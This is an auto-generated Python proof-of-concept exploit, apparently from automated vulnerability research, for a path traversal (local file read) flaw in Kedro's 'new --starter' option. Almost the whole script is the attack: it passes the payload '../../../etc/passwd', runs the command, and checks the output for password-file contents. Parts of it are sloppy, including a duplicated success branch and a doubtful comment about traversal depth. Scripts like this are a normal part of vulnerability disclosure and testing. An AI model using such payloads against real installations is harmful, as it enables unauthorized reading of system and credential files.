#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: lfi-019
# Sink: _get_prompts_required_and_clear_from_CLI_provided
# Auto-generated — run with: python3 lfi_cli_provided_opens_prompts__get_prompts_required_and_clear_from_CLI_provided.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in Kedro's --starter flag.

Vulnerability: The `new` command accepts a `--starter` argument that, if not a known
alias, is used directly as a template_path. This path is then used to construct a
cookiecutter_dir via pathlib's / operator, which does not sanitize '..' sequences.
The resulting path is checked with .is_file() and then opened to read prompts.yml.
An attacker can supply a path like '../../etc/passwd' to read arbitrary files.

This PoC demonstrates the vulnerability by attempting to read /etc/passwd.
"""

import subprocess
import sys
import os
import tempfile
import shutil

# Configuration
TARGET_FILE = "/etc/passwd"  # Benign file to read
# Path traversal payload: go up from the expected template directory structure
# The code constructs: cookiecutter_dir = tmpdir / template_path / checkout / directory
# We'll use a payload that goes up enough levels to reach root, then into /etc/passwd
# The tmpdir is something like /tmp/tmpXXXXXX, so we need to go up 3 levels to reach /
# Then into etc/passwd
PAYLOAD = "../../../etc/passwd"  # Goes from /tmp/tmpXXX/PAYLOAD/checkout/dir -> /etc/passwd

def main():
    print("[*] Kedro LFI PoC")
    print(f"[*] Attempting to read: {TARGET_FILE}")
    print(f"[*] Using payload: {PAYLOAD}")
    print()

    # Create a temporary directory to work in (Kedro will create its own tmpdir)
    work_dir = tempfile.mkdtemp(prefix="kedro_poc_")
    original_dir = os.getcwd()
    
    try:
        os.chdir(work_dir)
        print(f"[*] Working in: {work_dir}")
        
        # Run kedro new with the malicious --starter flag
        # We need to provide a project name and other required flags
        # The --starter flag will be our path traversal payload
        cmd = [
            sys.executable, "-m", "kedro", "new",
            "--starter", PAYLOAD,
            "--name", "poc_project",
            "--tools", "none",
            "--example", "no",
            "--telemetry", "no"
        ]
        
        print(f"[*] Running command: {' '.join(cmd)}")
        print("[*] This will attempt to read the target file via prompts.yml")
        print()
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        print(f"[*] Return code: {result.returncode}")
        print(f"[*] stdout: {result.stdout[:2000] if result.stdout else '(empty)'}")
        print(f"[*] stderr: {result.stderr[:2000] if result.stderr else '(empty)'}")
        
        # Check if we got the contents of /etc/passwd in the output
        if "root:" in result.stdout or "root:" in result.stderr:
            print("\n[!] SUCCESS! Found 'root:' in output - file was read!")
            print("[!] The vulnerability is confirmed - arbitrary file read via --starter")
        elif "root:" in result.stdout or "root:" in result.stderr:
            print("\n[!] SUCCESS! Found 'root:' in output - file was read!")
        else:
            print("\n[-] Did not find expected content. This could mean:")
            print("    - The file doesn't exist at the expected path")
            print("    - The vulnerability has been patched")
            print("    - Different path traversal depth needed")
            print("    - Check the full output above for any file contents")
            
    except subprocess.TimeoutExpired:
        print("[-] Command timed out")
    except FileNotFoundError:
        print("[-] kedro command not found. Is it installed?")
        print("    Try: pip install kedro")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        os.chdir(original_dir)
        shutil.rmtree(work_dir, ignore_errors=True)
        print(f"\n[*] Cleaned up working directory: {work_dir}")

if __name__ == "__main__":
    main()
